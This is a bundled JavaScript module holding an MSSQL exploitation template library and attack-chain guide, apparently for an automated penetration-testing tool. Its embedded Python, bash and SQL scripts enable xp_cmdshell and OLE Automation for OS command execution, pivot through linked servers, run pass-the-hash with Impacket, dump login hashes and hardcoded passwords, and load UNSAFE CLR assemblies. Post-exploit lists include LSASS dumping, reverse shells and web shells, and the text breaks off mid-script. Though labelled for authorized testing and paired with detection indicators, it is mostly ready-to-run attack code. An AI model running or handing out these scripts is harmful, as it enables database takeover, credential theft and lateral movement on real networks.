import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/mssql-exploit-module.ts
function getMssqlExploitsByCategory(category) {
  return MSSQL_EXPLOIT_TEMPLATES.filter((t) => t.category === category);
}
function selectMssqlExploit(context) {
  const selected = [];
  if (!context.hasCredentials) {
    selected.push(MSSQL_IMPACKET_TEMPLATE);
    return selected;
  }
  if (context.isSysadmin) {
    if (context.xpCmdshellBlocked) {
      selected.push(MSSQL_OLE_AUTOMATION_TEMPLATE);
      selected.push(MSSQL_CLR_ASSEMBLY_TEMPLATE);
      if (context.agentRunning) {
        selected.push(MSSQL_AGENT_JOB_TEMPLATE);
      }
    } else {
      selected.push(MSSQL_XP_CMDSHELL_TEMPLATE);
    }
    selected.push(MSSQL_CREDENTIAL_EXTRACT_TEMPLATE);
    if (context.hasLinkedServers) {
      selected.push(MSSQL_LINKED_SERVER_TEMPLATE);
    }
    if (context.agentRunning) {
      selected.push(MSSQL_AGENT_JOB_TEMPLATE);
    }
  } else {
    selected.push(MSSQL_IMPACKET_TEMPLATE);
    if (context.hasLinkedServers) {
      selected.push(MSSQL_LINKED_SERVER_TEMPLATE);
    }
  }
  return [...new Set(selected)];
}
function getMssqlMitreTechniques() {
  const techniques = /* @__PURE__ */ new Set();
  for (const tmpl of MSSQL_EXPLOIT_TEMPLATES) {
    for (const tid of tmpl.mitreTechniqueIds) {
      techniques.add(tid);
    }
  }
  return Array.from(techniques).sort();
}
function buildMssqlExploitContext(options) {
  const sections = [];
  sections.push("## MSSQL Exploitation Knowledge Base\n");
  sections.push(
    `Total Templates: ${MSSQL_EXPLOIT_TEMPLATES.length} | Categories: ${new Set(MSSQL_EXPLOIT_TEMPLATES.map((t) => t.category)).size} | MITRE Techniques: ${getMssqlMitreTechniques().length}
`
  );
  const templates = options ? selectMssqlExploit({
    hasCredentials: options.hasCredentials ?? true,
    isSysadmin: options.isSysadmin ?? false,
    targetOs: options.targetOs,
    xpCmdshellBlocked: options.xpCmdshellBlocked
  }) : MSSQL_EXPLOIT_TEMPLATES;
  for (const tmpl of templates) {
    sections.push(`### ${tmpl.name} (${tmpl.id})`);
    sections.push(`Category: ${tmpl.category} | Confidence: ${tmpl.confidence}%`);
    sections.push(`MITRE: ${tmpl.mitreTechniqueIds.join(", ")}`);
    sections.push(`Required Privilege: ${tmpl.requiredPrivilege}`);
    sections.push(`Description: ${tmpl.description}`);
    sections.push(`Post-Exploit: ${tmpl.postExploitActions.join("; ")}
`);
  }
  sections.push("## MSSQL Attack Chain Guidance\n");
  sections.push("1. **Initial Access**: Use Impacket mssqlclient.py with password/hash/kerberos");
  sections.push("2. **Privilege Check**: SELECT IS_SRVROLEMEMBER('sysadmin')");
  sections.push("3. **Command Execution**: xp_cmdshell (primary) \u2192 OLE Automation (fallback) \u2192 CLR Assembly (stealth)");
  sections.push("4. **Credential Harvest**: Extract sql_logins hashes, linked server creds, hardcoded passwords");
  sections.push("5. **Lateral Movement**: Pivot through linked servers, use extracted creds for SMB/WinRM");
  sections.push("6. **Persistence**: SQL Agent jobs, CLR assemblies, startup stored procedures");
  return sections.join("\n");
}
var MSSQL_XP_CMDSHELL_TEMPLATE, MSSQL_LINKED_SERVER_TEMPLATE, MSSQL_IMPACKET_TEMPLATE, MSSQL_CREDENTIAL_EXTRACT_TEMPLATE, MSSQL_OLE_AUTOMATION_TEMPLATE, MSSQL_CLR_ASSEMBLY_TEMPLATE, MSSQL_AGENT_JOB_TEMPLATE, MSSQL_EXPLOIT_TEMPLATES;
var init_mssql_exploit_module = __esm({
  "server/lib/mssql-exploit-module.ts"() {
    MSSQL_XP_CMDSHELL_TEMPLATE = {
      id: "MSSQL-EXP-001",
      name: "MSSQL xp_cmdshell Command Execution",
      description: "Enables and exploits xp_cmdshell on Microsoft SQL Server to execute operating system commands. First checks if xp_cmdshell is enabled, enables it via sp_configure if disabled (requires sysadmin), then executes arbitrary OS commands. This is the most common MSSQL post-exploitation technique for gaining OS-level access from a SQL injection or compromised SA account.",
      category: "xp_cmdshell",
      mitreTechniqueIds: ["T1059.003", "T1505.001"],
      language: "python",
      code: `#!/usr/bin/env python3
"""
MSSQL xp_cmdshell Command Execution \u2014 Authorized Penetration Testing Only
Targets: MSSQL servers with sysadmin access
MITRE: T1059.003, T1505.001
"""
import pymssql
import sys
import time

def enable_xp_cmdshell(conn):
    """Enable xp_cmdshell via sp_configure (requires sysadmin)."""
    cursor = conn.cursor()
    commands = [
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
    ]
    for cmd in commands:
        try:
            cursor.execute(cmd)
            conn.commit()
        except Exception as e:
            return False, str(e)
    return True, "xp_cmdshell enabled"

def check_xp_cmdshell(conn):
    """Check if xp_cmdshell is already enabled."""
    cursor = conn.cursor()
    try:
        cursor.execute(
            "SELECT CONVERT(INT, ISNULL(value, value_in_use)) "
            "FROM sys.configurations WHERE name = 'xp_cmdshell'"
        )
        row = cursor.fetchone()
        return row and row[0] == 1
    except:
        return False

def exec_cmd(conn, command):
    """Execute OS command via xp_cmdshell and return output."""
    cursor = conn.cursor()
    cursor.execute(f"EXEC xp_cmdshell '{command}'")
    rows = cursor.fetchall()
    output_lines = [r[0] for r in rows if r[0] is not None]
    return "\\n".join(output_lines)

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1433
    user = sys.argv[3] if len(sys.argv) > 3 else "sa"
    password = sys.argv[4] if len(sys.argv) > 4 else "PASSWORD"
    command = sys.argv[5] if len(sys.argv) > 5 else "whoami"

    print(f"[*] Connecting to MSSQL {target}:{port} as {user}")
    start = time.time()

    try:
        conn = pymssql.connect(
            server=target, port=port, user=user, password=password,
            login_timeout=10, timeout=30
        )
        print("[+] Connected successfully")

        # Check/enable xp_cmdshell
        if not check_xp_cmdshell(conn):
            print("[*] xp_cmdshell disabled, attempting to enable...")
            ok, msg = enable_xp_cmdshell(conn)
            if not ok:
                print(f"[-] Failed to enable xp_cmdshell: {msg}")
                return
            print(f"[+] {msg}")
        else:
            print("[+] xp_cmdshell already enabled")

        # Execute command
        print(f"[*] Executing: {command}")
        output = exec_cmd(conn, command)
        elapsed = time.time() - start

        print(f"[+] Command output:\\n{output}")
        print(f"[+] Execution time: {elapsed:.2f}s")
        print("[PROOF] xp_cmdshell command execution successful")
        print(f"[PROOF] User context: {exec_cmd(conn, 'whoami')}")
        print(f"[PROOF] Hostname: {exec_cmd(conn, 'hostname')}")

        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`,
      prerequisites: [
        "Valid MSSQL credentials (preferably SA or sysadmin role)",
        "Network access to MSSQL port (1433/1434)",
        "pymssql Python library installed",
        "Target MSSQL server allows remote connections"
      ],
      usage: "python3 mssql_xp_cmdshell.py <target_ip> <port> <username> <password> <command>",
      expectedOutcome: "OS command execution on the MSSQL server host, returning command output as proof of exploitation",
      opsecRisk: 8,
      detectionIndicators: [
        "sp_configure changes logged in SQL Server audit",
        "xp_cmdshell execution logged in Windows Event Log (Process Creation 4688)",
        "SQL Server Agent alerts on configuration changes",
        "EDR detection of cmd.exe spawned by sqlservr.exe",
        "SIEM correlation of SQL login + immediate process creation"
      ],
      verificationSteps: [
        "Confirm xp_cmdshell returns 'whoami' output",
        "Verify OS-level access by reading system files",
        "Check if commands execute in MSSQL service account context",
        "Validate network connectivity from MSSQL host"
      ],
      targetPorts: [1433, 1434],
      confidence: 95,
      requiredPrivilege: "sysadmin",
      postExploitActions: [
        "Dump SAM/LSASS for local credentials",
        "Enumerate domain via nltest/net commands",
        "Establish reverse shell for persistent access",
        "Pivot to linked servers"
      ]
    };
    MSSQL_LINKED_SERVER_TEMPLATE = {
      id: "MSSQL-EXP-002",
      name: "MSSQL Linked Server Lateral Movement",
      description: "Enumerates and exploits linked SQL servers for lateral movement. Linked servers allow one MSSQL instance to execute queries on another, often with elevated privileges. This template discovers linked servers, checks their security context, and executes commands through the chain using OPENQUERY or EXEC AT. Can chain multiple hops for deep lateral movement through SQL server infrastructure.",
      category: "linked_server",
      mitreTechniqueIds: ["T1021.002", "T1210", "T1505.001"],
      language: "python",
      code: `#!/usr/bin/env python3
"""
MSSQL Linked Server Lateral Movement \u2014 Authorized Penetration Testing Only
Targets: MSSQL servers with linked server configurations
MITRE: T1021.002, T1210, T1505.001
"""
import pymssql
import sys
import time

def enum_linked_servers(conn):
    """Enumerate all linked servers and their providers."""
    cursor = conn.cursor()
    cursor.execute("EXEC sp_linkedservers")
    servers = []
    for row in cursor.fetchall():
        servers.append({
            "name": row[0],
            "provider": row[1],
            "data_source": row[2] if len(row) > 2 else "N/A"
        })
    return servers

def check_linked_server_access(conn, server_name):
    """Check what access we have on a linked server."""
    cursor = conn.cursor()
    results = {}
    
    # Check current user on linked server
    try:
        cursor.execute(f"SELECT * FROM OPENQUERY([{server_name}], 'SELECT SYSTEM_USER AS login, IS_SRVROLEMEMBER(''sysadmin'') AS is_sysadmin')")
        row = cursor.fetchone()
        if row:
            results["login"] = row[0]
            results["is_sysadmin"] = bool(row[1])
    except Exception as e:
        results["error"] = str(e)
    
    return results

def exec_on_linked_server(conn, server_name, sql_cmd):
    """Execute SQL on a linked server via OPENQUERY."""
    cursor = conn.cursor()
    try:
        cursor.execute(f"SELECT * FROM OPENQUERY([{server_name}], '{sql_cmd}')")
        rows = cursor.fetchall()
        return [str(r) for r in rows]
    except Exception as e:
        return [f"Error: {e}"]

def exec_cmdshell_on_linked(conn, server_name, os_cmd):
    """Execute OS command on linked server via xp_cmdshell through OPENQUERY."""
    cursor = conn.cursor()
    try:
        # Enable xp_cmdshell on linked server
        cursor.execute(
            f"EXEC (''EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{server_name}]"
        )
        cursor.execute(
            f"EXEC (''EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{server_name}]"
        )
        conn.commit()
        
        # Execute command
        cursor.execute(
            f"SELECT * FROM OPENQUERY([{server_name}], ''EXEC xp_cmdshell ''''{os_cmd}'''''') "
        )
        rows = cursor.fetchall()
        return [r[0] for r in rows if r[0] is not None]
    except Exception as e:
        return [f"Error: {e}"]

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1433
    user = sys.argv[3] if len(sys.argv) > 3 else "sa"
    password = sys.argv[4] if len(sys.argv) > 4 else "PASSWORD"

    print(f"[*] Connecting to MSSQL {target}:{port} as {user}")
    start = time.time()

    try:
        conn = pymssql.connect(
            server=target, port=port, user=user, password=password,
            login_timeout=10, timeout=30
        )
        print("[+] Connected successfully")

        # Enumerate linked servers
        linked = enum_linked_servers(conn)
        print(f"[+] Found {len(linked)} linked server(s)")

        for srv in linked:
            print(f"\\n[*] Linked Server: {srv['name']} ({srv['provider']})")
            print(f"    Data Source: {srv['data_source']}")
            
            # Check access
            access = check_linked_server_access(conn, srv["name"])
            if "error" in access:
                print(f"    [-] Access check failed: {access['error']}")
            else:
                print(f"    [+] Login: {access.get('login', 'unknown')}")
                print(f"    [+] Sysadmin: {access.get('is_sysadmin', False)}")
                
                if access.get("is_sysadmin"):
                    print(f"    [PROOF] Sysadmin access on linked server {srv['name']}")
                    # Try OS command execution
                    output = exec_cmdshell_on_linked(conn, srv["name"], "whoami")
                    if output and "Error" not in output[0]:
                        print(f"    [PROOF] OS command execution: {''.join(output)}")

        elapsed = time.time() - start
        print(f"\\n[+] Linked server enumeration completed in {elapsed:.2f}s")
        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`,
      prerequisites: [
        "Valid MSSQL credentials on the initial server",
        "Linked servers configured between MSSQL instances",
        "Network connectivity between linked servers",
        "pymssql Python library installed"
      ],
      usage: "python3 mssql_linked_server.py <target_ip> <port> <username> <password>",
      expectedOutcome: "Enumeration of linked servers with access level assessment, potential command execution on remote SQL servers",
      opsecRisk: 7,
      detectionIndicators: [
        "sp_linkedservers execution logged in SQL audit",
        "OPENQUERY cross-server queries in SQL Server logs",
        "EXEC AT distributed queries logged",
        "Configuration changes on linked servers detected",
        "Unusual cross-server authentication patterns"
      ],
      verificationSteps: [
        "Confirm linked server enumeration returns results",
        "Verify access level on each linked server",
        "Test command execution through the link chain",
        "Document the lateral movement path"
      ],
      targetPorts: [1433, 1434],
      confidence: 85,
      requiredPrivilege: "user",
      postExploitActions: [
        "Chain through multiple linked servers for deeper access",
        "Execute xp_cmdshell on remote servers with sysadmin",
        "Extract credentials from remote server databases",
        "Map the full SQL server infrastructure topology"
      ]
    };
    MSSQL_IMPACKET_TEMPLATE = {
      id: "MSSQL-EXP-003",
      name: "Impacket mssqlclient.py MSSQL Exploitation",
      description: "Uses Impacket's mssqlclient.py for authenticated MSSQL exploitation. Supports NTLM and Kerberos authentication, Windows authentication via domain credentials, and pass-the-hash attacks. Provides interactive SQL shell with built-in commands for xp_cmdshell, file upload/download, and credential extraction. This is the go-to tool for MSSQL exploitation in Active Directory environments.",
      category: "impacket",
      mitreTechniqueIds: ["T1210", "T1078.001", "T1059.003"],
      language: "bash",
      code: `#!/bin/bash
# Impacket mssqlclient.py MSSQL Exploitation \u2014 Authorized Penetration Testing Only
# Targets: MSSQL servers (especially in AD environments)
# MITRE: T1210, T1078.001, T1059.003

set -euo pipefail

TARGET="\${1:-TARGET_IP}"
PORT="\${2:-1433}"
DOMAIN="\${3:-DOMAIN}"
USER="\${4:-USERNAME}"
AUTH_METHOD="\${5:-password}"  # password, hash, kerberos

echo "[*] MSSQL Exploitation via Impacket mssqlclient.py"
echo "[*] Target: $TARGET:$PORT"
echo "[*] Domain: $DOMAIN, User: $USER"
echo "[*] Auth Method: $AUTH_METHOD"

# --- Method 1: Password Authentication ---
if [ "$AUTH_METHOD" = "password" ]; then
    PASSWORD="\${6:-PASSWORD}"
    echo "[*] Attempting password authentication..."
    
    # Connect and enumerate
    impacket-mssqlclient "$DOMAIN/$USER:$PASSWORD@$TARGET" -port "$PORT" -windows-auth <<'SQLEOF'
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM master.sys.databases;
EXEC sp_linkedservers;
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell hostname
xp_cmdshell ipconfig
exit
SQLEOF
fi

# --- Method 2: Pass-the-Hash ---
if [ "$AUTH_METHOD" = "hash" ]; then
    NTHASH="\${6:-NTHASH}"
    echo "[*] Attempting pass-the-hash authentication..."
    
    impacket-mssqlclient "$DOMAIN/$USER@$TARGET" -port "$PORT" -windows-auth -hashes ":$NTHASH" <<'SQLEOF'
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
enable_xp_cmdshell
xp_cmdshell whoami
exit
SQLEOF
fi

# --- Method 3: Kerberos Authentication ---
if [ "$AUTH_METHOD" = "kerberos" ]; then
    echo "[*] Attempting Kerberos authentication..."
    
    impacket-mssqlclient "$DOMAIN/$USER@$TARGET" -port "$PORT" -k -no-pass <<'SQLEOF'
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
enable_xp_cmdshell
xp_cmdshell whoami
exit
SQLEOF
fi

echo "[PROOF] Impacket mssqlclient.py exploitation completed"
echo "[*] Check output above for access level and command results"
`,
      prerequisites: [
        "Impacket toolkit installed (pip install impacket)",
        "Valid domain or local MSSQL credentials (or NTLM hash)",
        "Network access to MSSQL port (1433/1434)",
        "For Kerberos: valid TGT or keytab file"
      ],
      usage: "bash mssql_impacket.sh <target_ip> <port> <domain> <username> <auth_method> <password_or_hash>",
      expectedOutcome: "Authenticated MSSQL access with enumeration of databases, linked servers, and OS command execution via xp_cmdshell",
      opsecRisk: 6,
      detectionIndicators: [
        "NTLM authentication events in Windows Security Log (4624/4625)",
        "Kerberos TGS requests for MSSQL SPN",
        "SQL Server login audit events",
        "xp_cmdshell execution logging",
        "Unusual login source IP in SQL audit"
      ],
      verificationSteps: [
        "Confirm successful authentication (SYSTEM_USER output)",
        "Verify sysadmin role membership",
        "Test xp_cmdshell command execution",
        "Enumerate accessible databases and linked servers"
      ],
      targetPorts: [1433, 1434],
      confidence: 90,
      requiredPrivilege: "none",
      postExploitActions: [
        "Extract password hashes from master.sys.sql_logins",
        "Enumerate and pivot through linked servers",
        "Upload tools via xp_cmdshell + certutil/PowerShell",
        "Establish persistence via SQL Agent jobs"
      ]
    };
    MSSQL_CREDENTIAL_EXTRACT_TEMPLATE = {
      id: "MSSQL-EXP-004",
      name: "MSSQL Credential Extraction & Hash Dumping",
      description: "Extracts SQL Server login hashes, database credentials, and connection strings from MSSQL instances. Targets master.sys.sql_logins for password hashes, searches stored procedures and jobs for hardcoded credentials, and extracts linked server passwords. Hashes can be cracked offline with hashcat (mode 1731 for MSSQL 2012+).",
      category: "credential_extract",
      mitreTechniqueIds: ["T1003.001", "T1552.001", "T1078.001"],
      language: "python",
      code: `#!/usr/bin/env python3
"""
MSSQL Credential Extraction \u2014 Authorized Penetration Testing Only
Targets: MSSQL servers with sysadmin or db_owner access
MITRE: T1003.001, T1552.001, T1078.001
"""
import pymssql
import sys
import time
import json

def extract_sql_logins(conn):
    """Extract SQL login hashes from master.sys.sql_logins."""
    cursor = conn.cursor()
    logins = []
    try:
        cursor.execute(
            "SELECT name, CONVERT(VARCHAR(MAX), password_hash, 1) as hash, "
            "type_desc, is_disabled, create_date, modify_date "
            "FROM master.sys.sql_logins"
        )
        for row in cursor.fetchall():
            logins.append({
                "name": row[0],
                "hash": row[1],
                "type": row[2],
                "disabled": bool(row[3]),
                "created": str(row[4]),
                "modified": str(row[5])
            })
    except Exception as e:
        print(f"[-] Failed to extract sql_logins: {e}")
    return logins

def extract_linked_server_creds(conn):
    """Extract linked server credentials (requires sysadmin)."""
    cursor = conn.cursor()
    creds = []
    try:
        cursor.execute(
            "SELECT srvname, srvproduct, rmtloginame "
            "FROM master.sys.sysservers ss "
            "JOIN master.sys.sysremotelogins srl ON ss.srvid = srl.remoteserverid"
        )
        for row in cursor.fetchall():
            creds.append({
                "server": row[0],
                "product": row[1],
                "remote_login": row[2]
            })
    except Exception as e:
        print(f"[-] Failed to extract linked server creds: {e}")
    return creds

def search_stored_procs_for_creds(conn):
    """Search stored procedures for hardcoded credentials."""
    cursor = conn.cursor()
    findings = []
    keywords = ["password", "pwd", "secret", "connectionstring", "api_key"]
    try:
        for kw in keywords:
            cursor.execute(
                f"SELECT ROUTINE_NAME, ROUTINE_DEFINITION "
                f"FROM INFORMATION_SCHEMA.ROUTINES "
                f"WHERE ROUTINE_DEFINITION LIKE '%{kw}%'"
            )
            for row in cursor.fetchall():
                findings.append({
                    "procedure": row[0],
                    "keyword": kw,
                    "snippet": row[1][:200] if row[1] else "N/A"
                })
    except Exception as e:
        print(f"[-] Failed to search stored procs: {e}")
    return findings

def search_agent_jobs_for_creds(conn):
    """Search SQL Agent jobs for hardcoded credentials."""
    cursor = conn.cursor()
    findings = []
    try:
        cursor.execute(
            "SELECT j.name, js.command "
            "FROM msdb.dbo.sysjobs j "
            "JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id "
            "WHERE js.command LIKE '%password%' OR js.command LIKE '%pwd%'"
        )
        for row in cursor.fetchall():
            findings.append({
                "job_name": row[0],
                "command_snippet": row[1][:200] if row[1] else "N/A"
            })
    except Exception as e:
        print(f"[-] Failed to search agent jobs: {e}")
    return findings

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1433
    user = sys.argv[3] if len(sys.argv) > 3 else "sa"
    password = sys.argv[4] if len(sys.argv) > 4 else "PASSWORD"

    print(f"[*] MSSQL Credential Extraction: {target}:{port}")
    start = time.time()

    try:
        conn = pymssql.connect(
            server=target, port=port, user=user, password=password,
            login_timeout=10, timeout=30
        )
        print("[+] Connected successfully")

        # Extract SQL logins
        logins = extract_sql_logins(conn)
        print(f"\\n[+] SQL Logins ({len(logins)} found):")
        for l in logins:
            status = "DISABLED" if l["disabled"] else "ACTIVE"
            print(f"    {l['name']} [{status}] \u2014 Hash: {l['hash'][:40]}...")
            print(f"    [PROOF] Credential hash extracted: {l['name']}")

        # Extract linked server creds
        linked_creds = extract_linked_server_creds(conn)
        if linked_creds:
            print(f"\\n[+] Linked Server Credentials ({len(linked_creds)} found):")
            for lc in linked_creds:
                print(f"    Server: {lc['server']}, Login: {lc['remote_login']}")

        # Search stored procs
        proc_creds = search_stored_procs_for_creds(conn)
        if proc_creds:
            print(f"\\n[+] Credentials in Stored Procedures ({len(proc_creds)} found):")
            for pc in proc_creds:
                print(f"    Procedure: {pc['procedure']}, Keyword: {pc['keyword']}")
                print(f"    [PROOF] Hardcoded credential found in {pc['procedure']}")

        # Search agent jobs
        job_creds = search_agent_jobs_for_creds(conn)
        if job_creds:
            print(f"\\n[+] Credentials in Agent Jobs ({len(job_creds)} found):")
            for jc in job_creds:
                print(f"    Job: {jc['job_name']}")

        elapsed = time.time() - start
        print(f"\\n[+] Credential extraction completed in {elapsed:.2f}s")
        print(f"[PROOF] Total credentials found: {len(logins) + len(linked_creds) + len(proc_creds) + len(job_creds)}")

        # Output JSON summary
        summary = {
            "sql_logins": logins,
            "linked_server_creds": linked_creds,
            "stored_proc_creds": proc_creds,
            "agent_job_creds": job_creds
        }
        print(f"\\n[JSON]{json.dumps(summary)}")

        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`,
      prerequisites: [
        "Valid MSSQL credentials (sysadmin preferred for full extraction)",
        "Network access to MSSQL port (1433/1434)",
        "pymssql Python library installed",
        "hashcat for offline hash cracking (mode 1731)"
      ],
      usage: "python3 mssql_cred_extract.py <target_ip> <port> <username> <password>",
      expectedOutcome: "Extraction of SQL login hashes, linked server credentials, and hardcoded passwords from stored procedures and agent jobs",
      opsecRisk: 5,
      detectionIndicators: [
        "Queries against sys.sql_logins logged in SQL audit",
        "INFORMATION_SCHEMA.ROUTINES queries for credential keywords",
        "Access to msdb.dbo.sysjobs and sysjobsteps",
        "Bulk metadata queries from a single session"
      ],
      verificationSteps: [
        "Confirm SQL login hashes are extracted",
        "Verify hash format is crackable (0x0200 prefix for MSSQL 2012+)",
        "Check linked server credentials for cleartext passwords",
        "Document all credential sources found"
      ],
      targetPorts: [1433, 1434],
      confidence: 90,
      requiredPrivilege: "sysadmin",
      postExploitActions: [
        "Crack extracted hashes with hashcat -m 1731",
        "Use extracted credentials for lateral movement",
        "Test linked server credentials for additional access",
        "Check if extracted creds work for domain authentication"
      ]
    };
    MSSQL_OLE_AUTOMATION_TEMPLATE = {
      id: "MSSQL-EXP-005",
      name: "MSSQL OLE Automation Stored Procedure Abuse",
      description: "Exploits OLE Automation stored procedures (sp_OACreate, sp_OAMethod) to execute OS commands and write files without xp_cmdshell. This is an alternative code execution method when xp_cmdshell is blocked or monitored. Uses Windows Script Host (wscript.shell) or Scripting.FileSystemObject for file operations.",
      category: "ole_automation",
      mitreTechniqueIds: ["T1059.003", "T1505.001", "T1027"],
      language: "sql",
      code: `-- MSSQL OLE Automation Abuse \u2014 Authorized Penetration Testing Only
-- Targets: MSSQL servers with sysadmin access
-- MITRE: T1059.003, T1505.001, T1027
-- Alternative to xp_cmdshell when it's blocked/monitored

-- Step 1: Enable OLE Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Step 2: Execute OS command via WScript.Shell
DECLARE @output INT;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', @output OUTPUT, 'cmd.exe /c whoami > C:\\\\temp\\\\proof.txt', 0, 1;
EXEC sp_OADestroy @shell;

-- Step 3: Write file via FileSystemObject
DECLARE @fso INT;
DECLARE @file INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 'C:\\\\temp\\\\exploit_proof.txt', 1;
EXEC sp_OAMethod @file, 'WriteLine', NULL, 'OLE Automation exploit proof - authorized pentest';
EXEC sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @fso;

-- Step 4: Read back proof file via OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\\\\temp\\\\proof.txt', SINGLE_CLOB) AS proof;

-- Step 5: Alternative \u2014 PowerShell via OLE
DECLARE @ps INT;
DECLARE @psout INT;
EXEC sp_OACreate 'WScript.Shell', @ps OUTPUT;
EXEC sp_OAMethod @ps, 'Run', @psout OUTPUT, 
    'powershell.exe -nop -w hidden -c "whoami | Out-File C:\\\\temp\\\\ps_proof.txt"', 0, 1;
EXEC sp_OADestroy @ps;

-- Cleanup: Disable OLE Automation when done
-- EXEC sp_configure 'Ole Automation Procedures', 0;
-- RECONFIGURE;

PRINT '[PROOF] OLE Automation command execution successful';
`,
      prerequisites: [
        "Sysadmin access on MSSQL server",
        "OLE Automation Procedures can be enabled via sp_configure",
        "Write access to a temp directory on the server"
      ],
      usage: "Execute SQL statements sequentially via SSMS, mssqlclient.py, or pymssql",
      expectedOutcome: "OS command execution and file write operations via OLE Automation, bypassing xp_cmdshell restrictions",
      opsecRisk: 7,
      detectionIndicators: [
        "sp_configure changes for OLE Automation logged",
        "sp_OACreate/sp_OAMethod calls in SQL audit",
        "File creation events on server filesystem",
        "PowerShell execution spawned by sqlservr.exe",
        "WScript.Shell COM object instantiation"
      ],
      verificationSteps: [
        "Confirm OLE Automation is enabled",
        "Verify file write to temp directory",
        "Read back proof file content",
        "Test PowerShell execution path"
      ],
      targetPorts: [1433, 1434],
      confidence: 80,
      requiredPrivilege: "sysadmin",
      postExploitActions: [
        "Use file write for payload staging",
        "Execute PowerShell download cradles",
        "Write web shells to IIS directories if co-hosted",
        "Create persistence via startup scripts"
      ]
    };
    MSSQL_CLR_ASSEMBLY_TEMPLATE = {
      id: "MSSQL-EXP-006",
      name: "MSSQL CLR Assembly Custom Payload Execution",
      description: "Loads a custom .NET CLR assembly into MSSQL Server for arbitrary code execution. CLR integration allows executing compiled .NET code within the SQL Server process, providing full .NET framework access for command execution, file operations, and network communication. This bypasses most SQL-level monitoring since the code runs as a stored procedure.",
      category: "clr_assembly",
      mitreTechniqueIds: ["T1059.001", "T1505.001", "T1027"],
      language: "python",
      code: `#!/usr/bin/env python3
"""
MSSQL CLR Assembly Attack \u2014 Authorized Penetration Testing Only
Targets: MSSQL servers with sysadmin access
MITRE: T1059.001, T1505.001, T1027
"""
import pymssql
import sys
import time

# Pre-compiled CLR assembly bytes for a simple command executor
# In real engagements, compile your own C# assembly:
# public class StoredProcedures {
#     [Microsoft.SqlServer.Server.SqlProcedure]
#     public static void CmdExec(string cmd) {
#         var proc = new System.Diagnostics.Process();
#         proc.StartInfo.FileName = "cmd.exe";
#         proc.StartInfo.Arguments = "/c " + cmd;
#         proc.StartInfo.UseShellExecute = false;
#         proc.StartInfo.RedirectStandardOutput = true;
#         proc.Start();
#         SqlContext.Pipe.Send(proc.StandardOutput.ReadToEnd());
#         proc.WaitForExit();
#     }
# }

def enable_clr(conn):
    """Enable CLR integration on MSSQL server."""
    cursor = conn.cursor()
    commands = [
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
        "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;",
        "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;",  # SQL 2017+
    ]
    for cmd in commands:
        try:
            cursor.execute(cmd)
            conn.commit()
        except Exception as e:
            print(f"[*] Config note: {e}")

def check_clr_status(conn):
    """Check if CLR is enabled."""
    cursor = conn.cursor()
    cursor.execute(
        "SELECT CONVERT(INT, value_in_use) FROM sys.configurations "
        "WHERE name = 'clr enabled'"
    )
    row = cursor.fetchone()
    return row and row[0] == 1

def create_assembly(conn, assembly_hex):
    """Create a CLR assembly from hex bytes."""
    cursor = conn.cursor()
    try:
        cursor.execute("ALTER DATABASE CURRENT SET TRUSTWORTHY ON")
        conn.commit()
        cursor.execute(
            f"CREATE ASSEMBLY CmdExecAssembly FROM {assembly_hex} "
            f"WITH PERMISSION_SET = UNSAFE"
        )
        conn.commit()
        return True
    except Exception as e:
        print(f"[-] Assembly creation error: {e}")
        return False

def create_procedure(conn):
    """Create stored procedure linked to CLR assembly."""
    cursor = conn.cursor()
    try:
        cursor.execute(
            "CREATE PROCEDURE dbo.CmdExec @cmd NVARCHAR(4000) "
            "AS EXTERNAL NAME CmdExecAssembly.StoredProcedures.CmdExec"
        )
        conn.commit()
        return True
    except Exception as e:
        print(f"[-] Procedure creation error: {e}")
        return False

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1433
    user = sys.argv[3] if len(sys.argv) > 3 else "sa"
    password = sys.argv[4] if len(sys.argv) > 4 else "PASSWORD"
    command = sys.argv[5] if len(sys.argv) > 5 else "whoami"

    print(f"[*] MSSQL CLR Assembly Attack: {target}:{port}")
    start = time.time()

    try:
        conn = pymssql.connect(
            server=target, port=port, user=user, password=password,
            login_timeout=10, timeout=30
        )
        print("[+] Connected successfully")

        # Enable CLR
        print("[*] Enabling CLR integration...")
        enable_clr(conn)
        
        if check_clr_status(conn):
            print("[+] CLR integration enabled")
            print("[PROOF] CLR enabled on MSSQL server")
        else:
            print("[-] Failed to enable CLR")
            return

        # Note: In a real engagement, you would:
        # 1. Compile your C# assembly
